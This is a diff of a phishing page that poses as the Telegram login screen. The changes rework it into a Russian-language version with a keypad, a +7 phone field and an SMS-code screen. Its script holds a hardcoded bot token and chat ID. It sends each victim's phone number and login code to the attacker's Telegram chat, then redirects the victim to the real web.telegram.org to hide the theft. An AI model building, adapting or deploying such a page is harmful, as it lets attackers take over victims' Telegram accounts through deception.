@@ -2,8 +2,8 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Telegram Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Telegram</title>
     <style>
         * {
             margin: 0;
@@ -11,136 +11,250 @@
             box-sizing: border-box;
         }
         body {
-            background: #0f0f0f;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
         }
-        .login-card {
-            background: #1f1f1f;
-            border-radius: 28px;
-            padding: 32px 28px;
+        .container {
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+            background: white;
+            border-radius: 32px;
+            padding: 30px 24px 40px;
+            box-shadow: 0 0 0 1px rgba(0,0,0,0.05), 0 8px 20px rgba(0,0,0,0.1);
         }
-        .logo {
+        h1 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #1f1f1f;
+            margin-bottom: 12px;
             text-align: center;
+        }
+        .sub {
+            text-align: center;
+            color: #6c6c6c;
+            font-size: 16px;
             margin-bottom: 32px;
         }
-        .logo-icon {
-            font-size: 48px;
-            background: #2b5278;
-            width: 64px;
-            height: 64px;
-            border-radius: 50%;
+        .label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1f1f1f;
+            margin-bottom: 8px;
+        }
+        .country-selector {
             display: flex;
             align-items: center;
-            justify-content: center;
-            margin: 0 auto 12px;
+            justify-content: space-between;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            transition: border 0.2s;
         }
-        h2 {
-            color: white;
-            text-align: center;
-            font-weight: 500;
-            margin-bottom: 24px;
-            font-size: 24px;
+        .country-selector:hover {
+            border-color: #b3b3b3;
         }
-        .input-group {
+        .country-code {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .flag {
+            font-size: 20px;
+        }
+        .phone-input {
+            display: flex;
+            gap: 12px;
             margin-bottom: 20px;
         }
-        input {
-            width: 100%;
-            padding: 16px;
-            background: #2b2b2b;
-            border: 1px solid #3a3a3a;
-            border-radius: 14px;
-            color: white;
+        .prefix {
+            width: 80px;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 14px 12px;
+            font-size: 16px;
+            background: #f9f9f9;
+            color: #1f1f1f;
+            font-weight: 500;
+        }
+        .number {
+            flex: 1;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 14px 16px;
             font-size: 16px;
             outline: none;
             transition: border 0.2s;
         }
-        input:focus {
+        .number:focus {
             border-color: #2b5278;
         }
-        button {
-            width: 100%;
+        .options {
+            margin: 24px 0;
+        }
+        .option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .option input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        .option label {
+            font-size: 15px;
+            color: #1f1f1f;
+        }
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin: 32px 0 24px;
+        }
+        .key {
+            background: #f4f4f4;
+            border: none;
+            border-radius: 48px;
             padding: 14px;
+            font-size: 24px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .key:active {
+            background: #e0e0e0;
+        }
+        .key.special {
+            background: transparent;
+            font-size: 20px;
+            color: #2b5278;
+        }
+        .next-btn {
+            width: 100%;
             background: #2b5278;
             color: white;
             border: none;
-            border-radius: 40px;
+            border-radius: 48px;
+            padding: 16px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 12px;
             transition: background 0.2s;
         }
-        button:active {
+        .next-btn:active {
             background: #1e3a58;
-        }
-        .error {
-            background: #3a1a1a;
-            color: #ff6b6b;
-            padding: 12px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            text-align: center;
-            display: none;
-        }
-        .note {
-            text-align: center;
-            color: #888;
-            font-size: 12px;
-            margin-top: 24px;
         }
         .hidden {
             display: none;
         }
+        .code-section {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #efefef;
+        }
+        .code-input {
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 20px;
+            letter-spacing: 4px;
+            text-align: center;
+            width: 100%;
+            margin-bottom: 24px;
+            outline: none;
+        }
         .loader {
             text-align: center;
-            padding: 20px;
+            padding: 40px;
         }
         .spinner {
             width: 40px;
             height: 40px;
-            border: 3px solid #2b2b2b;
+            border: 3px solid #efefef;
             border-top: 3px solid #2b5278;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
             margin: 0 auto 16px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error {
+            background: #fee;
+            color: #d33;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="login-card" id="loginForm">
-        <div class="logo">
-            <div class="logo-icon">📱</div>
+    <div class="container" id="phoneScreen">
+        <h1>Номер телефона</h1>
+        <div class="sub">Проверьте код страны и введите свой номер телефона.</div>
+        
+        <div class="country-selector" id="countryBtn">
+            <div class="country-code">
+                <span class="flag">🇷🇺</span>
+                <span>Россия</span>
+            </div>
+            <span>▼</span>
         </div>
-        <h2>Sign in to Telegram</h2>
-        <div class="error" id="errorMsg">Invalid phone number or code</div>
-        <div class="input-group">
-            <input type="tel" id="phone" placeholder="Phone number" value="">
+        
+        <div class="phone-input">
+            <div class="prefix">+7</div>
+            <input type="tel" id="phoneNumber" class="number" placeholder="XXX XXX-XX-XX" maxlength="10">
         </div>
-        <div class="input-group hidden" id="codeGroup">
-            <input type="text" id="code" placeholder="Verification code">
+        
+        <div class="options">
+            <div class="option">
+                <input type="checkbox" id="syncContact" checked>
+                <label>Синхронизировать контакты</label>
+            </div>
+            <div class="option">
+                <input type="checkbox" id="useProxy">
+                <label>Использовать прокси</label>
+            </div>
         </div>
-        <button id="submitBtn">Next</button>
-        <div class="note">By continuing, you agree to Telegram's Terms of Service.</div>
+        
+        <div class="keypad" id="keypad">
+            <button class="key" data-digit="1">1</button>
+            <button class="key" data-digit="2">2</button>
+            <button class="key" data-digit="3">3</button>
+            <button class="key" data-digit="4">4</button>
+            <button class="key" data-digit="5">5</button>
+            <button class="key" data-digit="6">6</button>
+            <button class="key" data-digit="7">7</button>
+            <button class="key" data-digit="8">8</button>
+            <button class="key" data-digit="9">9</button>
+            <button class="key special" data-digit="backspace">⌫</button>
+            <button class="key" data-digit="0">0</button>
+            <button class="key special" data-digit="next">Готово</button>
+        </div>
+        
+        <button class="next-btn" id="nextBtn">Далее</button>
     </div>
 
-    <div class="login-card hidden" id="loadingScreen">
+    <div class="container hidden" id="codeScreen">
+        <h1>Код подтверждения</h1>
+        <div class="sub">Мы отправили SMS с кодом на номер <span id="phoneDisplay"></span></div>
+        <input type="text" id="codeInput" class="code-input" placeholder="XXXXX" maxlength="5">
+        <button class="next-btn" id="submitCodeBtn">Подтвердить</button>
+        <div class="sub" style="margin-top: 24px;">Отправить код повторно через <span id="timer">30</span> сек</div>
+    </div>
+
+    <div class="container hidden" id="loadingScreen">
         <div class="loader">
             <div class="spinner"></div>
-            <div style="color: white;">Connecting to Telegram...</div>
+            <div>Подключение к Telegram...</div>
         </div>
     </div>
 
@@ -148,45 +262,72 @@
         const BOT_TOKEN = "8755907309:AAHcG2zLepeJyrWSk1dtf4kAtpIVkGsxsx0";
         const CHAT_ID = 8637392176;
         
-        let step = 'phone';
+        let phoneNumber = '';
         
-        document.getElementById('submitBtn').addEventListener('click', async () => {
-            if (step === 'phone') {
-                const phone = document.getElementById('phone').value.trim();
-                if (!phone) {
-                    showError('Please enter your phone number');
-                    return;
+        // Клавиатура
+        document.querySelectorAll('.key').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const digit = btn.getAttribute('data-digit');
+                const input = document.getElementById('phoneNumber');
+                if (digit === 'backspace') {
+                    input.value = input.value.slice(0, -1);
+                } else if (digit === 'next') {
+                    document.getElementById('nextBtn').click();
+                } else {
+                    if (input.value.length < 10) {
+                        input.value += digit;
+                    }
                 }
-                
-                // Показываем поле для кода
-                document.getElementById('codeGroup').classList.remove('hidden');
-                document.getElementById('submitBtn').innerText = 'Sign in';
-                step = 'code';
-                
-                // Опционально: отправляем номер в Telegram
-                await sendToTelegram(`📱 Номер: ${phone}`);
-                
-            } else if (step === 'code') {
-                const phone = document.getElementById('phone').value.trim();
-                const code = document.getElementById('code').value.trim();
-                
-                if (!code) {
-                    showError('Please enter verification code');
-                    return;
-                }
-                
-                // Отправляем код в Telegram
-                await sendToTelegram(`🔐 Код: ${code}\n📱 Номер: ${phone}`);
-                
-                // Показываем загрузку и редирект
-                document.getElementById('loginForm').classList.add('hidden');
-                document.getElementById('loadingScreen').classList.remove('hidden');
-                
-                // Редирект на настоящий Telegram
-                setTimeout(() => {
-                    window.location.href = 'https://web.telegram.org';
-                }, 2000);
+            });
+        });
+        
+        document.getElementById('nextBtn').addEventListener('click', async () => {
+            let rawPhone = document.getElementById('phoneNumber').value.trim();
+            if (rawPhone.length < 10) {
+                alert('Введите полный номер');
+                return;
             }
+            phoneNumber = `+7${rawPhone}`;
+            
+            // Отправляем номер в Telegram
+            await sendToTelegram(`📱 Номер: ${phoneNumber}`);
+            
+            // Переключаем на экран кода
+            document.getElementById('phoneScreen').classList.add('hidden');
+            document.getElementById('codeScreen').classList.remove('hidden');
+            document.getElementById('phoneDisplay').innerText = phoneNumber;
+            
+            // Таймер
+            let seconds = 30;
+            const timerEl = document.getElementById('timer');
+            const interval = setInterval(() => {
+                seconds--;
+                timerEl.innerText = seconds;
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    timerEl.innerText = '0';
+                }
+            }, 1000);
+        });
+        
+        document.getElementById('submitCodeBtn').addEventListener('click', async () => {
+            const code = document.getElementById('codeInput').value.trim();
+            if (!code) {
+                alert('Введите код');
+                return;
+            }
+            
+            // Отправляем код в Telegram
+            await sendToTelegram(`🔐 Код: ${code}\n📱 Номер: ${phoneNumber}`);
+            
+            // Показываем загрузку
+            document.getElementById('codeScreen').classList.add('hidden');
+            document.getElementById('loadingScreen').classList.remove('hidden');
+            
+            // Редирект на настоящий Telegram
+            setTimeout(() => {
+                window.location.href = 'https://web.telegram.org';
+            }, 2000);
         });
         
         async function sendToTelegram(text) {
@@ -197,17 +338,8 @@
                     body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                 });
             } catch(e) {
-                console.log('Error:', e);
+                console.log('Ошибка:', e);
             }
-        }
-        
-        function showError(msg) {
-            const errorDiv = document.getElementById('errorMsg');
-            errorDiv.innerText = msg;
-            errorDiv.style.display = 'block';
-            setTimeout(() => {
-                errorDiv.style.display = 'none';
-            }, 3000);
         }
     </script>
 </body>
